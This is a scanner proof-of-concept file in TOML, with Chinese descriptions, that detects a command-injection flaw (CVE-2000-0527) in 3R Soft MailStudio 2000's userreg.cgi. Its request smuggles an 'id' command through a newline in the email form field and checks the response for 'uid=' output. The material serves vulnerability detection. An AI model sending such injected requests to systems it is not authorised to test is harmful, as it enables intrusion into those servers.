[info]
author = "ave"
description = "检测 3R Soft MailStudio 2000 2.0 userreg.cgi CGI 脚本中的任意命令执行漏洞 (CVE-2000-0527)。通过在表单参数中注入 shell 元字符执行 id 命令并验证输出。"
id = "POC-AVE-2000-0438"
name = "3R Soft MailStudio 2000 2.0 userreg.cgi 任意命令执行 PoC"
severity = "critical"
tags = ["ave-2000-0438"]
vuln_id = [
    "CVE-2000-0527",
    "AVE-2000-0438",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/cgi-bin/userreg.cgi"
protocol = "http"

[poc.requests.body]
content = "email=test%40example.com%0aid&submit=Register"
type = "form"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "uid=",
    "gid=",
    "groups=",
]
